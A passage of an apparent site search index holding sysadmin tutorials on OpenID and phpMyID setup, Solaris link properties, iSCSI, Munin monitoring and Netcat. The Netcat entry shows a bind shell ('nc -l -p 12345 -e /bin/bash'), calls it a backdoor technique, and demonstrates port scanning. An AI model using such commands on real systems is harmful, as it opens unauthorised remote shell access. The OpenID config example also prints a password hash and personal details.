                content: " Introduction linkThe issue of single sign-on (SSO) has been a longstanding challenge in the IT world. It was primarily a concern for businesses, where users regularly access numerous applications in their daily work (workstations, email, time management tools, remote servers, etc.). You might say that average users also access many such applications for personal use. While this is true, until recently, remembering a few passwords on a personal machine didn’t justify the effort needed to implement an SSO solution. However, with the explosion of internet access and the proliferation of blogs, wikis, forums, and commercial websites, the question of simplifying the management of multiple accounts arises again. This is where OpenID comes in. After a brief overview of single sign-on, we’ll detail OpenID and then explore different possibilities for implementing an OpenID-based solution.\nSingle Sign-On linkThe principle of single sign-on is to allow users to authenticate once during their session and manage access to certain personal data (name, first name, email, etc.):\nThey authenticate with the authentication server (using username/password, for example). All authentication requests from any application are redirected to the authentication server, which authenticates the user to the application. No intervention is required from the user. The application can obtain certain personal data about the user from the authentication server, which the user has previously authorized for sharing. When the user ends their session, their authentication is revoked. OpenID linkOpenID is a free and decentralized single sign-on solution. It allows you to quickly obtain a digital identity, change or revoke this identity just as quickly. Since the architecture is decentralized, you don’t depend on a single service provider: you can change regularly and easily or even host your own digital identity!\nWith your OpenID digital identity, you can:\nConnect once and access all your favorite sites without remembering all the username/password combinations previously needed Centralize changes to your information (e.g., changing your email address) Manage access permissions to your information for each site you visit Note that we’re not talking about security here. From the perspective of a site requesting authentication, OpenID only confirms that the person wanting to connect is the person whose digital identity is described by the provided URL, and that the information provided by the OpenID server concerns this person. From there, there are two scenarios:\nEither the site has blind trust in the OpenID server and determines that if the user is valid, they can connect to the site Or the site requests authentication from the OpenID server but then manages access rights itself OpenID is just a building block that simplifies authentication. It doesn’t eliminate the need to implement a security policy on sites using this technology.\nHow OpenID Works linkIn a single sign-on authentication, and therefore during authentication via OpenID, there are three entities: the user who wishes to authenticate (actually, the browser being used, EU or End User); the site on which the user wishes to authenticate (RP or Relaying Party); the authentication server (OP or OpenID Provider, here the OpenID server).\nDuring this authentication, the following exchanges occur between the three entities: the user enters their OpenID identifier on the site where they wish to authenticate; the site then contacts the server, and they share a secret; the user is redirected to the server which asks them to authenticate (if this is the first access of the browsing session); the user is informed of the data the site wishes to access; the user decides what data they wish to share with the site; the user is then redirected back to the site, with their information encrypted thanks to the shared secret established between the site and the server; the user is authenticated on the site.\nThe user thus has control over what they wish to share with the site, and this information is transmitted securely from the server to the site.\nOpenID Extensions linkThe OpenID specifications cover the protocol in a global manner. They are specialized through extensions:\nSimple Registration Extension (SREG): it allows a very lightweight profile exchange, suitable for use on most sites, with this lightweight profile containing only the 9 fields identified as recurring for web identifications (nickname, full name, email address, date of birth, language, time zone, gender, country, and postal code). Yadis Discovery Protocol: this is a proposal for resource description and discovery (person, document, service) via URLs, which is used in OpenID 2.0 although external to the OpenID project. Provider Authentication Policy Extension (PAPE): currently still in draft form, this is an extension allowing the site (RP) to specify to the OpenID server (OP) which security policy should be applied regarding user authentication, and conversely allowing OP to specify to RP which security policy was applied during authentication, in order to strengthen the trust relationships between the different stakeholders. OpenID from the User’s Perspective linkUsing OpenID linkUsing OpenID is really simple. First, you need to choose an OpenID service provider (OpenIDFrance, Verisign, Myopenid, Yahoo, your personal server, etc.) and register with this provider to obtain an OpenID digital identity, materialized by a URL (example: http://www.openidfrance.fr/jean.christophe.lauffer).\nYou then simply provide this URL as an OpenID identifier on sites allowing authentication via OpenID.\nIf this is your first connection for this session, you will be redirected to your OpenID service provider’s site to authenticate, then, if the authentication is correct, the site will receive the information necessary for your connection; if this is not your first connection for this session, the site will automatically receive (provided you have authorized this site to receive information about you) the information necessary for your connection.\nFinally, you close your browsing session, which erases the data from your authentication session.\nSetting up a redirection to a URL of your choice:\nThe two lines inserted between the and tags redirect the OpenID request to the server that actually hosts your OpenID identity. Suppose the code above is placed in the file http://www.drylm.org/jc.lauffer. I could then use this new URL instead of the original one provided by OpenIDFrance, while keeping my identity with them.\nThis way, you benefit from the identity provider’s service, which you don’t have to manage, and you have a personalized OpenID identifier that may better reflect your identity (http://company/identifier), but above all is more easily memorable. Additionally, if you change your OpenID identity provider, you simply change the line in your HTML file and continue to use the same personalized identifier.\nThere is still one disadvantage, and everyone will judge its importance: without falling into paranoia, are you really sure about what the identity provider does with your personal information?\nIf this point concerns you, know that thanks to OpenID, you can perfectly well host this information yourself. That’s what we’ll explore in the next section.\nSetting Up Your Own Identity Server linkOf course, there isn’t just one solution (see the list of known libraries on the OpenID site [5]). Here’s a non-exhaustive list of libraries allowing you to create your own OpenID server:\nC++: opkele [6] (notably used by the OpenID authentication module for Apache) PHP: php-openid Perl: Net::OpenID Python: python-openid Ruby: port of the Python library For our example, we’ll use a standalone server [8] in PHP, very lightweight: phpMyID [9]. phpMyID allows you to quickly set up a personal identity server. You need a web server with PHP installed, on which you can upload files. Let’s set up this type of identity server right away. Fasten your seatbelts, here we go!\nDownload the latest available version from the phpMyID site [9] and extract the archive. You will then get several files. The ones we’re interested in are:\nMyID.php: the library implementing OpenID’s basic functions MyID.config.php: the configuration file for our OpenID server README: help file in English. The explanations are much more complete than what I’ll give, refer to it in case of more specific needs or problems. The identity server installation is done as follows:\nUpload the PHP files to your personal server (for example, I uploaded them to the directory: http://www.drylm.org/jean-christophe/) Load the configuration page to get the domain (“realm”). In my case: http://www.drylm.org/jean-christophe/MyID.config.php. I get the display that you can see in figure 1. The domain (“realm”) here is therefore phpMyID. It’s time to set up the username/password pair that will be used to authenticate you on your OpenID server: you need to get an md5 hash from the information identifier, domain (“realm”) obtained in the previous section, and password: You get a hash (it’s the large hexadecimal number); then modify the MyID.config.php file with the chosen login and the hash obtained:\n** * User profile * @name $profile * @global array $GLOBALS['profile'] */ $GLOBALS['profile'] = array( # Basic Config - Required 'auth_username' =\u003e 'jean-christophe', 'auth_password' =\u003e '58d0a37a9dadec29546e0dce2360dbd7', ); Update the SREG (Simple Registration) data in the MyID.config.php file: /** * Simple Registration Extension * @name $sreg * @global array $GLOBALS['sreg'] */ $GLOBALS['sreg'] = array ( 'nickname' =\u003e 'jean-christophe', 'email' =\u003e 'jean-christophe.lauffer@drylm.org', 'fullname' =\u003e 'Jean-Christophe LAUFFER', # 'dob' =\u003e '1979-11-05', 'gender' =\u003e 'M', # 'postcode' =\u003e '35135', 'country' =\u003e 'FR', 'language' =\u003e 'fr', 'timezone' =\u003e 'Europe/Paris' ); Comment out with a # the data you don’t want to share.\nUpload the modified MyID.config.php file to the server again, then reload the configuration page to verify the connection: if you get a similar message, your identity server is correctly configured. At this point, you have a personal digital identity (in my case http://www.drylm.org/jean-christophe/MyID.config.php) on a personal (very simple) server, which guarantees that your information is not hosted (and especially disclosed) by a third party.\nBut this URL is not easy to remember. You have two choices: rename the MyID.config.php file to index.php or write an index.php file containing these lines of code:\nof course replacing the addresses with your own. You can then use a URL like http://www.drylm.org/jean-christophe which is much easier to remember!\nAs a site administrator, you typically use either a ready-made solution that can be modified (Drupal, MediaWiki…), which generally offers extensions to manage different authentication methods, or a completely rewritten solution, in which case you’ll need to get your hands dirty. We’ll therefore study two implementation examples to illustrate these possibilities.\nOpenID from the Site Administrator’s Perspective linkImplementation on Drupal linkDrupal is a CMS, a Web content management application. It’s this tool that’s installed on our website. The installation of the OpenID plugin is very simple:\nConnect to your site with a user who has administration rights, then go to Administer -\u003e Modules and enable the OpenID module (available in Drupal’s base package, no additional download is needed). Then go to your user’s profile page and you’ll find an OpenId Identities tab. Click on it and add your OpenID authentication URL. Then log out of your session and on the main page of your Drupal installation, you can choose the OpenID authentication mode.\nImplementation on Your Own Site linkWe’re going to build a small example of calling an OpenID server for user authentication using the php-openid library [7]. This example is taken from the example provided with the library. The example contains four files:\nThese 4 commented files can be downloaded from the Linux Pratique website, at http://www.linux-pratique.com/download/, archive named LP48_openid.tar.gz\ncommon.php: this file contains the definitions of global functions necessary for dialogue with the OpenID server. index.php: this is the main file, which is used to enter the OpenID URL and manage the display of information by inclusion in the other files. authentication.php: this file contains the first part of the authentication process: creation of a consumer (which will be used to communicate with the server) construction of the request that will be sent to the OpenID server in the form of a URL redirection to the OpenID server for the user to authenticate with it. recovery.php: this file contains the last part of the authentication process: creation of a consumer (which will be used to communicate with the server) recovery of the response sent by the OpenID server analysis of the response display of the provided data. To test this example, whose complete sources you can find on our site [11], simply publish these four files on a web server (it works even locally on your own machine) and enter your OpenID identity URL (Fig. 2)!\nPhishing linkAs with most sensitive data transmitted over the Internet, there is a risk of phishing inherent to the principle of authentication redirection in OpenID. Indeed, nothing prevents a malicious site from redirecting you to a fake page with the aim of stealing your login information. It is therefore up to the user to be vigilant about the trust they place in the sites they connect to. Discussions about possible ways to circumvent this problem are currently ongoing: they are available on the wiki.\nThis should not dissuade you from using OpenID, but on the contrary encourage you to be very vigilant (this advice is valid in general; not just for OpenID, but you’ve probably been told this before ;-)).\nConclusion linkWe have just completed an introductory journey to OpenID. Thanks to this article, we hope that single sign-on and authentication via OpenID are no longer just vague terms glimpsed by chance while surfing. Single sign-on is emerging from the business world to become democratized and reach personal users, who are facing a multiplication of accounts, especially on the internet.\nWe have laid the foundations that will allow you to use OpenID, whether you are a user or a website administrator. We hope we have interested you enough to make you want to look a little more into this technology.\nResources link http://www.unixgarden.com/index.php/web/decouvrez-openid-un-systeme-d%E2%80%99authentification-decentralise OpenID foundation: http://openid.net/ OpenID France: http://www.openidfrance.fr/ Specifications of the OpenID format and its extensions: http://openid.net/developers/#specs Site dedicated to OpenID developers: http://www.openidsource.org List of libraries: http://wiki.openid.net/Bibliothèques/ opkele: http://kin.klever.net/libopkele/ php-openid: http://www.openidenabled.com/php-openid/ List of standalone servers: http://wiki.openid.net/Run_your_own_identity_server_(fr) phpMyID site: http://siege.org/projects/phpMyID/ Drupal site: http://www.drupal.org Example sources: http://www.drylm.org/lp/openid "
            }
        );
    index.add(
            {
                id:  482 ,
                href: "\/Modifier_les_param%C3%A8tres_des_cartes_r%C3%A9seaux\/",
                title: "Modifying Network Card Parameters",
                description: "A guide to modifying network card parameters in Solaris using the dladm utility, including how to view and modify link properties.",
                content: "Introduction linkProject Brussels from the OpenSolaris project revamped how link properties are managed, and their push to get rid of ndd and device-specific properties is now well underway!\nShow properties linkLink properties are actually pretty cool, and they can be displayed with the dladm utilities “show-linkprop” option:\n$ dladm show-linkprop e1000g0 LINK PROPERTY PERM VALUE DEFAULT POSSIBLE e1000g0 speed r- 0 0 -- e1000g0 autopush -- -- -- -- e1000g0 zone rw -- -- -- e1000g0 duplex r- half half half,full e1000g0 state r- down up up,down e1000g0 adv_autoneg_cap rw 1 1 1,0 e1000g0 mtu rw 1500 1500 -- e1000g0 flowctrl rw bi bi no,tx,rx,bi e1000g0 adv_1000fdx_cap r- 1 1 1,0 e1000g0 en_1000fdx_cap rw 1 1 1,0 e1000g0 adv_1000hdx_cap r- 0 1 1,0 e1000g0 en_1000hdx_cap r- 0 1 1,0 e1000g0 adv_100fdx_cap r- 1 1 1,0 e1000g0 en_100fdx_cap rw 1 1 1,0 e1000g0 adv_100hdx_cap r- 1 1 1,0 e1000g0 en_100hdx_cap rw 1 1 1,0 e1000g0 adv_10fdx_cap r- 1 1 1,0 e1000g0 en_10fdx_cap rw 1 1 1,0 e1000g0 adv_10hdx_cap r- 1 1 1,0 e1000g0 en_10hdx_cap rw 1 1 1,0 e1000g0 maxbw rw -- -- -- e1000g0 cpus rw -- -- -- e1000g0 priority rw high high low,medium,high As you can see in the above output, the typical speed, duplex, mtu and flowctrl properties are listed. In addition to those, the “maxbw” and “cpus” properties that were introduced with the recent crossbow putback are visible. The “maxbw” property is especially useful, since it allows you to limit how much bandwidth is available to an interface. Here is an example that caps bandwidth for an interface at 2Mb/s:\ndladm set-linkprop -p maxbw=2m e1000g0 To see how this operates, you can use your favorite data transfer client:\n$ scp techtalk1* 192.168.1.10: Password: techtalk1.mp3 5% 2128KB 147.0KB/s 04:08 ETA Modify properties linkThe read/write link properties can be changed on the fly with dladm, so increasing the “maxbw” property will allow the interface to consume additional bandwidth:\n$ dladm set-linkprop -p maxbw=10m e1000g0 Once the bandwidth is increased, you can immediately see this reflected in the data transfer progress:\ntechtalk1.mp3 45% 17MB 555.3KB/s 00:38 ETA Clearview rocks, and it’s awesome to see that link properties are going to be managed in a standard uniform way going forward! Nice!\nResources linkhttps://prefetch.net/blog/index.php/2009/03/15/viewing-network-device-properties-on-solaris-hosts/\n"
            }
        );
    index.add(
            {
                id:  483 ,
                href: "\/Bwm-ng_:_Mesurer_la_consommation_de_bande_passante_en_temps_r%C3%A9el\/",
                title: "Bwm-ng: Measure Bandwidth Consumption in Real Time",
                description: "How to use bwm-ng to monitor network bandwidth usage in real-time on Linux systems.",
                content: "Introduction linkSometimes, you need to measure the current total bandwidth. bwm-ng is your friend :-)\nInstallation linkOn Debian, it’s easy:\napt-get install bwm-ng Usage linkSimply run the command to get it working directly:\n$ bwm-ng bwm-ng v0.6 (probing every 0.500s), press 'h' for help input: /proc/net/dev type: rate | iface Rx Tx Total ============================================================================== lo: 0.00 KB/s 0.00 KB/s 0.00 KB/s eth0: 2275.89 KB/s 57.56 KB/s 2333.45 KB/s ------------------------------------------------------------------------------ total: 2275.89 KB/s 57.56 KB/s 2333.45 KB/s "
            }
        );
    index.add(
            {
                id:  484 ,
                href: "\/GS_:_Assembler_plusieurs_PDF_pour_n\u0027en_fait_qu\u0027un\/",
                title: "GS: Merge Multiple PDFs Into One",
                description: "Learn how to use GhostScript (GS) to merge multiple PDF files into a single document.",
                content: "Introduction linkYou may need to merge multiple PDF files to get only one. Here is the solution.\nUsage link gs -q -sPAPERSIZE=letter -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=out.pdf `ls *.pdf` This command merges all PDF files in the current directory into one PDF file (the out.pdf file).\n"
            }
        );
    index.add(
            {
                id:  485 ,
                href: "\/WebVZ%5C_:_Administrer_ces_VM_OpenVZ_en_interface_web\/",
                title: "WebVZ: Manage OpenVZ VMs with a Web Interface",
                description: "A guide to WebVZ, a web interface for managing OpenVZ virtual machines.",
                content: "To have a web interface for managing your OpenVZ VMs, WebVZ is available:\nDocumentation on how to get WebVZ to Administrate OpenVZ\nManaging OpenVZ With The WebVZ Control Panel On Debian Lenny\n"
            }
        );
    index.add(
            {
                id:  486 ,
                href: "\/Hdiutil_:_Cr%C3%A9er_un_ISO_DVD_depuis_un_dossier_VIDEO_TS\/",
                title: "Hdiutil: Creating a DVD ISO from a VIDEO TS folder",
                description: "How to create a DVD ISO from a VIDEO_TS folder using hdiutil on Mac OS X",
                content: "Introduction linkYou may sometimes need to create a DVD from a VIDEO_TS folder. This is the solution.\nUsage link $ hdiutil makehybrid -udf -udf-volume-name DVD_NAME -o MY_DVD.iso /path/ /path/ is the root folder of the DVD, not the VIDEO_TS folder.\n"
            }
        );
    index.add(
            {
                id:  487 ,
                href: "\/Voir_les_fichiers_et_dossiers_cach%C3%A9s_sous_Mac_OS_X\/",
                title: "Viewing Hidden Files and Folders in Mac OS X",
                description: "How to view hidden files and folders in Mac OS X system.",
                content: "Introduction linkBy default Mac OS X doesn’t show any hidden files or folders. If you want to see everything, follow these steps.\nUsage linkShow all hidden objects:\n$ defaults write com.apple.Finder AppleShowAllFiles TRUE Swap TRUE with FALSE to turn it off again. Note: Finder must be relaunched afterwards to see the effect. For example like this:\n$ killall Finder \u0026\u0026 open /System/Library/CoreServices/Finder.app "
            }
        );
    index.add(
            {
                id:  488 ,
                href: "\/aoe-mise-en-place-d-un-serveur-ata-over-ethernet\/",
                title: "AOE: Setting Up an ATA Over Ethernet Server",
                description: "Guide for implementing an ATA Over Ethernet (AOE) server to transport ATA commands over an Ethernet network.",
                content: "Introduction linkATA over Ethernet (AoE) is a network layer protocol that allows ATA commands to be transported over an Ethernet network.\nResources linkUsing ATA Over Ethernet (AoE) On Debian Lenny (Initiator And Target)\n"
            }
        );
    index.add(
            {
                id:  489 ,
                href: "\/Cr%C3%A9er_un_partage_iSCSI_entre_Solaris_et_Debian\/",
                title: "Creating an iSCSI Share Between Solaris and Debian",
                description: "How to set up an iSCSI share between Solaris (server) and Debian (client)",
                content: "1 Introduction linkTechnology is beautiful, isn’t it! Here’s a guide to create an iSCSI share between Solaris and Debian. Be careful with performance as this remains iSCSI - I don’t recommend it for production environments unless you know what you’re doing.\nIn this setup, Solaris will be our server and Debian our client.\n2 Installation link2.1 Solaris linkLet’s verify that we have the required packages:\n$ pkginfo | grep iscsi system SUNWiscsir Sun iSCSI Device Driver (root) system SUNWiscsitgtr Sun iSCSI Target (Root) system SUNWiscsitgtu Sun iSCSI Target (Usr) system SUNWiscsiu Sun iSCSI Management Utilities (usr) 2.2 Debian linkLet’s install Open iSCSI:\napt-get install open-iscsi 3 Configuration link3.1 Solaris linkActivate the iSCSI target service:\nsvcadm enable iscsitgt Now, let’s configure iSCSI discovery:\niscsiadm modify discovery –sendtargets enable iscsiadm add discovery-address Create ZFS volumes to export:\nzfs create tank/xen zfs set shareiscsi=on tank/xen Volume1 will inherit properties from tank/xen and will be shared automatically:\nzfs create -s -V 10g tank/xen/volume1 Then verify that everything is working:\niscsiadm list target Target: iqn.1986-03.com.sun:02:6bc5ce3d-eb83-4055-fe67-d1fd9a7eb7b7 Alias: tank/xen/volume1 TPGT: 1 ISID: 4000002a0000 Connections: 1 3.2 Debian linkLog into the target:\niscsiadm -m discovery -t st -p :3260,1 iqn.1986-03.com.sun:02:6bc5ce3d-eb83-4055-fe67-d1fd9a7eb7b7 debian-test# iscsiadm -m node -l -T \"iqn.1986-03.com.sun:02:6bc5ce3d-eb83-4055-fe67-d1fd9a7eb7b7? Logging in to [iface: default, target: iqn.1986-03.com.sun:02:6bc5ce3d-eb83-4055-fe67-d1fd9a7eb7b7, portal: ,3260] Login to [iface: default, target: iqn.1986-03.com.sun:02:6bc5ce3d-eb83-4055-fe67-d1fd9a7eb7b7, portal: ,3260]: successful Verify that everything is working:\n[58182.163989] sd 3:0:0:0: [sdc] 20971520 512-byte hardware sectors (10737 MB) [58182.167839] sd 3:0:0:0: [sdc] Write Protect is off [58182.167867] sd 3:0:0:0: [sdc] Mode Sense: 67 00 00 08 [58182.171977] sd 3:0:0:0: [sdc] Write cache: disabled, read cache: enabled, doesn't support DPO or FUA [58182.175981] sd 3:0:0:0: [sdc] 20971520 512-byte hardware sectors (10737 MB) [58182.175989] sd 3:0:0:0: [sdc] Write Protect is off [58182.175989] sd 3:0:0:0: [sdc] Mode Sense: 67 00 00 08 [58182.183974] sd 3:0:0:0: [sdc] Write cache: disabled, read cache: enabled, doesn't support DPO or FUA [58182.183989] sdc: sdc1 [58182.187989] sd 3:0:0:0: [sdc] Attached SCSI disk 4 Resources linkhttp://www.rottenbytes.info/?p=50\n"
            }
        );
    index.add(
            {
                id:  490 ,
                href: "\/Munin_:_Surveiller_ses_serveurs_de_fa%C3%A7ons_tr%C3%A8s_simple\/",
                title: "Munin: Monitor your servers in a very simple way",
                description: "A tutorial on installing and configuring Munin, a simple yet powerful system monitoring tool that provides a web interface and supports client/server architecture.",
                content: "Introduction linkMunin is a relatively unknown monitoring tool, but unlike Cacti, it is very very simple to use and install. It is also full of surprising features.\nHere’s an overview:\nSimplicity Web interface for consultation Client/server architecture Support for RRDTool for graph generation Many plugins available Alert sending to Nagios SNMP protocol support Automatic detection of services on the machine For a demo: http://munin.ping.uio.no/\nInstallation linkTo install Munin, there are 2 components:\nMunin: The server Munin-node: The client The server should be installed on the main machine as it will contain a web graphical interface.\nServer linkTo install the server, it’s quite simple:\napt-get install munin Munin is now installed.\nClient linkTo install the client, run this command:\napt-get install munin-node Next, we need to configure it.\nConfiguration linkYou found the installation simple? Well, the configuration is the same!\nServer linkEdit the “/etc/munin/munin.conf” file and adapt it to your configuration:\n[fire.deimos.fr] # Enter the name of your first machine address 127.0.0.1 # If it's also the server, don't change this line use_node_name yes [burnin.deimos.fr] # Here the name of my client address 10.8.0.6 # Here the IP address of my client use_node_name yes Accelerate data collection linkTo speed up data collection with munin-update, add to /etc/munin/munin.conf on the master:\n# /etc/munin/munin.conf fork yes This way, munin will create a fork for each machine to query, rather than querying them one after another.\nClient linkThe client is now installed, edit the “/etc/munin/munin-node.conf” file:\nallow ^127\\.0\\.0\\.1$ Replace this address if the client is not installed on the server. If it’s just the client that is installed on this machine, then replace the address with that of the server.\nThen restart the client:\n/etc/init.d/munin-node restart Add-ons link All available services on the machine are detected by the munin-node-configure command: munin-node-configure –suggest | grep yes cpu | no | yes df | no | yes df_inode | no | yes entropy | no | yes exim_mailqueue | no | yes exim_mailstats | no | yes forks | no | yes if_ | no | yes +eth0 +eth1 if_err_ | no | yes +eth0 +eth1 interrupts | no | yes The Debian package activates plugins for detected services by creating links in the /etc/munin/plugins directory: ls -l /etc/munin/plugins lrwxrwxrwx 1 root root 28 Nov 20 18:14 cpu -\u003e /usr/share/munin/plugins/cpu lrwxrwxrwx 1 root root 27 Nov 20 18:14 df -\u003e /usr/share/munin/plugins/df You can disable a plugin by removing its symlink and enable it by creating a symlink: ln -s /usr/share/munin/plugins/apache_volume /etc/munin/plugins/ ZFS linkThis is a Solaris-only plugin (requires the Kstat module) that monitors I/O on ZFS pools:\n#!/usr/perl5/bin/perl -w # ZFS munin plugin for (Open)Solaris # By Nico use strict; use Sun::Solaris::Kstat; my $Kstat = Sun::Solaris::Kstat-\u003enew(); my $bytes_read = ${Kstat}-\u003e{unix}-\u003e{0}-\u003e{vopstats_zfs}-\u003e{read_bytes}; my $bytes_write = ${Kstat}-\u003e{unix}-\u003e{0}-\u003e{vopstats_zfs}-\u003e{write_bytes}; if($ARGV[0] \u0026\u0026 $ARGV[0] eq \"config\") { print \"graph_title ZFS Read/Write bytes\\n\"; print \"graph_args --base 1024 -l 0\\n\"; print \"graph_category disk\\n\"; print \"read.label Bytes read\\n\"; print \"read.info Bytes read on the ZFS pools\\n\"; print \"write.label Bytes written\\n\"; print \"write.info Bytes written on the ZFS pools\\n\"; print \"read.type DERIVE\\n\"; print \"read.min 0\\n\"; print \"write.type DERIVE\\n\"; print \"write.min 0\\n\"; exit 0; } print \"read.value \".$bytes_read.\"\\n\"; print \"write.value \".$bytes_write.\"\\n\"; Resources linkDocumentation on Monitoring Multiple Systems With Munin\nMonitoring with Munin\nhttp://www.rottenbytes.info/?p=79\n"
            }
        );
    index.add(
            {
                id:  491 ,
                href: "\/Netcat:%C2%A0utilisation\/",
                title: "Netcat: Usage",
                description: "Learn how to use Netcat, the Swiss Army knife utility for network operations including port scanning, file transfers, chat, proxying and more.",
                content: "Introduction linkNetcat is often referred to as a “Swiss Army knife” utility, and for a good reason. Just like the multi-function usefulness of the venerable Swiss Army pocket knife, netcat’s functionality is as helpful. Some of its features include port scanning, transferring files, port listening and it can be used a backdoor.\nIn 2006 netcat was ranked #4 in “[1] Top 100 Network Security Tools” survey, so it’s definitely a tool to know.\nInstallation linkIf you’re on Debian or Debian based system such as Ubuntu do the following:\nsudo aptitude install netcat Usage linkLet’s start with a few very simple examples and build up on those.\nIf you remember, I said that netcat was a Swiss Army knife. What would a Swiss Army knife be if it also wasn’t a regular knife, right? That’s why netcat can be used as a replacement of telnet:\nnc www.google.com 80 It’s actually much more handy than the regular telnet because you can terminate the connection at any time with ctrl+c, and it handles binary data as regular data (no escape codes, nothing).\nYou may add “-v” parameter for more verboseness, and two -v’s (-vv) to get statistics of how many bytes were transmitted during the connection.\nNetcat can also be used as a server itself. If you start it as following, it will listen on port 12345 (on all interfaces):\nnc -l -p 12345 If you now connect to port 12345 on that host, everything you type will be sent to the other party, which leads us to using netcat as a chat server. Start the server on one computer:\n# On a computer A with IP 10.10.10.10 nc -l -p 12345 And connect to it from another:\n# On computer B nc 10.10.10.10 12345 Now both parties can chat!\nTalking of which, the chat can be turned to make two processes talk to each other, thus making nc do I/O over network! For example, you can send the whole directory from one computer to another by piping tar to nc on the first computer, and redirecting output to another tar process on the second.\nSuppose you want to send files in /data from computer A with IP 192.168.1.10 to computer B (with any IP). It’s as simple as this:\n# On computer A with IP 192.168.1.10 tar -cf - /data # On computer B nc 192.168.1.10 6666 Don’t forget to combine the pipeline with pipe viewer from previous article in this series to get statistics on how fast the transfer is going!\nA single file can be sent even easier:\n# On computer A with IP 192.168.1.10 cat file # On computer B nc 192.168.1.10 6666 \u003e file You may even copy and restore the whole disk with nc:\n# On computer A with IP 192.168.1.10 cat /dev/hdb # On computer B nc 192.168.1.10 6666 \u003e /dev/hdb Note: It turns out that “-l” can’t be used together with “-p” on a Mac! The solution is to replace “-l -p 6666” with just “-l 6666”. Like this:\nnc -l 6666 nc now listens on port 6666 on a Mac computer\nAn uncommon use of netcat is port scanning. Netcat is not the best tool for this job, but it does it ok (the best tool is nmap):\n$ nc -v -n -z -w 1 192.168.1.2 1-1000 (UNKNOWN) [192.168.1.2] 445 (microsoft-ds) open (UNKNOWN) [192.168.1.2] 139 (netbios-ssn) open (UNKNOWN) [192.168.1.2] 111 (sunrpc) open (UNKNOWN) [192.168.1.2] 80 (www) open (UNKNOWN) [192.168.1.2] 25 (smtp) : Connection timed out (UNKNOWN) [192.168.1.2] 22 (ssh) open The “-n” parameter here prevents DNS lookup, “-z” makes nc not to receive any data from the server, and “-w 1” makes the connection timeout after 1 second of inactivity.\nAnother uncommon behavior is using netcat as a proxy. Both ports and hosts can be redirected. Look at this example:\nnc -l -p 12345 This starts a nc server on port 12345 and all the connections get redirected to google.com:80. If you now connect to that computer on port 12345 and do a request, you will find that no data gets sent back. That’s correct, because we did not set up a bidirectional pipe. If you add another pipe, you can get the data back on another port:\nnc -l -p 12345 After you have sent the request on port 12345, connect on port 12346 to get the data.\nProbably the most powerful netcat’s feature is making any process a server:\nnc -l -p 12345 -e /bin/bash The “-e” option spawns the executable with it’s input and output redirected via network socket. If you now connect to the host on port 12345, you may use bash:\n$ nc localhost 12345 ls -las total 4288 4 drwxr-xr-x 15 pkrumins users 4096 2009-02-17 07:47 . 4 drwxr-xr-x 4 pkrumins users 4096 2009-01-18 21:22 .. 8 -rw------- 1 pkrumins users 8192 2009-02-16 19:30 .bash_history 4 -rw-r--r-- 1 pkrumins users 220 2009-01-18 21:04 .bash_logout ... The consequences are that nc is a popular hacker tool as it is so easy to create a backdoor on any computer. On a Linux computer you may spawn /bin/bash and on a Windows computer cmd.exe to have total control over it.\nThat’s everything I can think of. Do you know any other netcat uses that I did not include?\nAdvanced usage linknetcat as a portscanner link nc -v -n -z -w 1 127.0.0.1 22-1000 Create a single-use TCP (or UDP) proxy linkRedirect the local port 2000 to the remote port 3000. The same but UDP:\nnc -u -l -p 2000 -c \"nc -u example.org 3000\" It may be used to “convert” TCP client to UDP server (or viceversa):\nnc -l -p 2000 -c \"nc -u example.org 3000\" References linkhttp://www.catonmat.net/blog/unix-utilities-netcat/\n"
            }
        );
    index.add(
            {
                id:  492 ,
                href: "\/Ganeti_:_Management_d\u0027un_Cluster_Xen\/",
                title: "Ganeti: Xen Cluster Management",
                description: "Ganeti is a virtual server management tool built on top of Xen virtual machine monitor for easy cluster management of virtual servers.",
                content: "Introduction linkGaneti is a virtual server management software tool built on top of Xen virtual machine monitor and other Open Source software.\nHowever, Ganeti requires pre-installed virtualization software on your servers in order to function. Once installed, the tool will take over the management part of the virtual instances (Xen DomU), e.g. disk creation management, operating system installation for these instances (in co-operation with OS-specific install scripts), and startup, shutdown, failover between physical systems. It has been designed to facilitate cluster management of virtual servers and to provide fast and simple recovery after physical failures using commodity hardware.\nDocumentation linkDocumentation on Xen Cluster Management With Ganeti\nXen Cluster Management With Ganeti On Debian Lenny\n"
            }
        );
    index.add(
            {
                id:  493 ,
                href: "\/Memcached_:_Mise_en_place_d\u0027un_serveur_de_cache_pour_Apache\/",
                title: "Memcached: Setting up a Cache Server for Apache",
                description: "How to set up Memcached as a caching server for Apache to accelerate client requests and improve performance.",
                content: "Introduction linkMemcached is a caching server that helps accelerate client requests.\nSetup linkHere’s documentation for setting up a memcached cache server:\nInstalling memcached And The PHP5 memcache Module\nOther linkTo get statistics on memcached and calculate hits and ratios:\necho -en \"stats\\r\\n\" \"quit\\r\\n\" | nc localhost 11211 | tr -s [:cntrl:] \" \"| cut -f42,48 -d\" \" | sed \"s/\\([0-9]*\\)\\s\\([0-9]*\\)/ \\2\\/\\1*100/\" | bc -l "
            }
        );
    index.add(
            {
                id:  494 ,
                href: "\/Date_:_utilisation_avanc%C3%A9e_de_la_commande_date\/",
                title: "Date: Advanced Usage of the Date Command",
                description: "Guide to advanced date calculations and formatting using the Linux date command, including examples for calculating past dates and creating ISO 8601 timestamps.",
                content: "Introduction linkThe date command can be very useful for advanced date calculations.\nUsage link Calculates the date 2 weeks ago from Saturday in the specified format: date -d '2 weeks ago Saturday' +%Y-%m-%d Unix alias for date command that lets you create timestamps in ISO 8601 format: alias timestamp='date \"+%Y%m%dT%H%M%S\"' "
            }
        );
    index.add(
            {
                id:  495 ,
                href: "\/Weathermap4RRD_:_faire_des_cartes_de_monitoring\/",
                title: "Weathermap4RRD: Creating Monitoring Maps",
                description: "Guide to create network monitoring maps using Weathermap4RRD and Cacti",
